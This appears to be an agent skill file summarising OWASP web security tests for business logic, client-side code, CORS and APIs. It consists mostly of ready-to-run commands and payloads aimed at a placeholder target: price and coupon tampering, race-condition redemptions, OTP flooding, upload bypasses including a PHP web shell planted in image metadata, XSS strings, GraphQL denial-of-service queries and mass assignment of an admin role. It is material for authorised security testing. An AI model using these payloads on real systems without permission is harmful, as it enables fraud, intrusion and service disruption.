---
name: wstg-logic-client-api
description: WSTG business logic, client-side, and API security testing
tags: [logic, client-side, api, graphql, cors, websocket, wstg]
version: "1.0"
---

# Business Logic, Client-Side & API Testing (WSTG-BUSL + CLNT + APIT)

## Business Logic Testing

### Price & Payment Manipulation
```bash
# Negative quantity/price
curl -X POST https://TARGET/api/cart -d '{"item_id":1,"quantity":-1,"price":100}'

# Zero/fractional values
curl -X POST https://TARGET/api/cart -d '{"item_id":1,"quantity":0.001}'

# Modify price client-side
curl -X POST https://TARGET/api/checkout -d '{"item_id":1,"price":0.01}'

# Currency confusion
curl -X POST https://TARGET/api/checkout -d '{"amount":100,"currency":"JPY"}'
# (JPY has no decimals; mishandled conversion)

# Discount/coupon abuse
curl -X POST https://TARGET/api/apply-coupon -d '{"code":"SAVE50","code":"SAVE50"}'
# Test: apply multiple times, expired codes, codes from other users
```

### Workflow Bypass
```bash
# Skip steps in multi-step process
# Step 1: /checkout/address → Step 2: /checkout/payment → Step 3: /checkout/confirm
# Try accessing Step 3 directly:
curl -s -H "Cookie: session=TOKEN" https://TARGET/checkout/confirm

# Modify step indicator
curl -X POST https://TARGET/checkout -d '{"step":3,"complete":true}'

# Process flow reversal
# Complete payment → go back → change cart → order ships with old payment
```

### Rate Limiting & Function Abuse
```bash
# Test rate limits
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST https://TARGET/api/send-otp -d '{"phone":"1234567890"}'
done

# Race condition (send concurrent requests)
# Multiple redemptions of single-use code
for i in $(seq 1 10); do
  curl -s -X POST https://TARGET/api/redeem \
    -d '{"code":"SINGLE_USE"}' &
done
wait

# Vote/like stuffing
for i in $(seq 1 50); do
  curl -s -X POST https://TARGET/api/vote -d '{"post_id":1}' \
    -H "Cookie: session=TOKEN"
done
```

### File Upload Abuse
```bash
# Extension bypass
# file.php → file.php.jpg, file.pHp, file.php%00.jpg, file.php;.jpg
# Double extension: file.jpg.php, file.php.png

# Content-type bypass
curl -X POST https://TARGET/upload \
  -F "file=@shell.php;type=image/jpeg"

# Polyglot files (valid image + valid PHP)
# Create with: exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
# Rename to image.php.jpg

# Oversized file (DoS)
dd if=/dev/urandom of=bigfile.bin bs=1M count=100
curl -X POST https://TARGET/upload -F "file=@bigfile.bin"

# SVG with XSS
# <svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>

# XXE via DOCX (unzip, inject XXE in [Content_Types].xml)
```

## Client-Side Testing

### DOM XSS Sources & Sinks

**Sources (attacker-controlled input):**
```javascript
document.URL
document.location
document.referrer
window.location.hash
window.location.search
window.name
postMessage data
localStorage / sessionStorage
```

**Sinks (dangerous execution points):**
```javascript
// High risk
eval()
document.write()
document.writeln()
innerHTML
outerHTML
insertAdjacentHTML()
element.setAttribute("onclick", ...)
setTimeout(string, ...)
setInterval(string, ...)
new Function(string)
$.html()  // jQuery

// Medium risk
window.location = ...
window.location.href = ...
document.cookie = ...
element.src = ...
```

### DOM XSS Testing
```javascript
// Check for vulnerable patterns in JS
// In browser console:
// Search for sources flowing to sinks

// Test via URL fragment (not sent to server)
https://TARGET/page#<img src=x onerror=alert(1)>
https://TARGET/page#javascript:alert(1)

// Test via query params reflected in DOM
https://TARGET/page?q=<script>alert(1)</script>
https://TARGET/search?term=test" onmouseover="alert(1)
```

### postMessage Vulnerabilities
```javascript
// Check for listeners without origin validation
// In browser console:
// Look for: window.addEventListener("message", ...)
// Vulnerable if no event.origin check

// Test: open target in iframe, send malicious message
// <iframe src="https://TARGET" id="target"></iframe>
// document.getElementById('target').contentWindow.postMessage('payload','*');
```

### Clickjacking Test
```bash
# Check headers
curl -sI https://TARGET | grep -i "x-frame-options\|content-security-policy"

# Missing X-Frame-Options AND no frame-ancestors in CSP = vulnerable
# Create PoC:
# <iframe src="https://TARGET/sensitive-action" style="opacity:0.1" width="500" height="500"></iframe>
# <button style="position:absolute;top:X;left:Y">Click me!</button>
```

### Browser Storage Audit
```javascript
// In browser console, check for sensitive data:
// localStorage
for(let i=0; i<localStorage.length; i++) {
  let key = localStorage.key(i);
  console.log(key + ": " + localStorage.getItem(key));
}
// sessionStorage
for(let i=0; i<sessionStorage.length; i++) {
  let key = sessionStorage.key(i);
  console.log(key + ": " + sessionStorage.getItem(key));
}
// Look for: tokens, passwords, PII, API keys
```

## CORS Misconfiguration Testing

```bash
# Test 1: Reflected origin
curl -sI https://TARGET/api/data -H "Origin: https://evil.com" | grep -i "access-control"
# Vulnerable if: Access-Control-Allow-Origin: https://evil.com
# AND: Access-Control-Allow-Credentials: true

# Test 2: Null origin
curl -sI https://TARGET/api/data -H "Origin: null" | grep -i "access-control"
# Vulnerable if: Access-Control-Allow-Origin: null

# Test 3: Subdomain match bypass
curl -sI https://TARGET/api/data -H "Origin: https://evil.TARGET" | grep -i "access-control"

# Test 4: Prefix/suffix bypass
curl -sI https://TARGET/api/data -H "Origin: https://TARGETevil.com" | grep -i "access-control"
curl -sI https://TARGET/api/data -H "Origin: https://evil-TARGET" | grep -i "access-control"

# Test 5: Wildcard with credentials
# Access-Control-Allow-Origin: * WITH Access-Control-Allow-Credentials: true
# → Browser blocks, but still a misconfiguration
```

## API Security Testing

### REST API Enumeration
```bash
# Common API documentation paths
curl -s https://TARGET/swagger.json
curl -s https://TARGET/openapi.json
curl -s https://TARGET/api-docs
curl -s https://TARGET/swagger/v1/swagger.json
curl -s https://TARGET/v1/api-docs
curl -s https://TARGET/.well-known/openapi.json

# Method enumeration on endpoints
for method in GET POST PUT PATCH DELETE OPTIONS HEAD; do
  echo -n "$method: "
  curl -s -o /dev/null -w "%{http_code}" -X $method https://TARGET/api/endpoint
  echo
done

# Version testing
curl -s https://TARGET/api/v1/users
curl -s https://TARGET/api/v2/users
curl -s -H "Accept: application/vnd.api.v1+json" https://TARGET/api/users
```

### GraphQL Testing
```bash
# Introspection query
curl -s -X POST https://TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name type { name } } } } }"}'

# Full introspection (save for analysis)
curl -s -X POST https://TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { name } mutationType { name } types { name kind fields { name args { name type { name } } type { name kind ofType { name } } } } } }"}' | jq . > schema.json

# Batch query (test for DoS)
curl -s -X POST https://TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"{ user(id:1) { name } }"},{"query":"{ user(id:2) { name } }"}]'

# Deep nesting (DoS)
curl -s -X POST https://TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user { friends { friends { friends { friends { name } } } } } }"}'

# Common endpoints
# /graphql, /graphiql, /v1/graphql, /api/graphql, /query
```

### WebSocket Testing
```bash
# Connect and test
wscat -c "wss://TARGET/ws"
# or
websocat wss://TARGET/ws

# Test injection in messages
# Send: {"action":"getUser","id":"1 OR 1=1"}
# Send: {"msg":"<script>alert(1)</script>"}

# Check for:
# - No origin validation (CSWSH - Cross-Site WebSocket Hijacking)
# - No authentication after upgrade
# - Injection in message handling
# - Sensitive data in messages without encryption (ws:// vs wss://)
```

### Mass Assignment in APIs
```bash
# Find writable fields by comparing GET response with PUT/PATCH
GET_RESPONSE=$(curl -s https://TARGET/api/profile -H "Cookie: session=TOKEN")
echo $GET_RESPONSE | jq .
# Take all fields from response, add admin fields, send back:
curl -X PUT https://TARGET/api/profile \
  -H "Content-Type: application/json" \
  -H "Cookie: session=TOKEN" \
  -d '{"name":"test","email":"test@test.com","role":"admin","isVerified":true}'
```

For detailed procedures on any test, read:
`knowledge/web-application/WSTG-BUSL/WSTG-BUSL-{NN}.md`
`knowledge/web-application/WSTG-CLNT/WSTG-CLNT-{NN}.md`
`knowledge/web-application/WSTG-APIT/WSTG-APIT-{NN}.md`
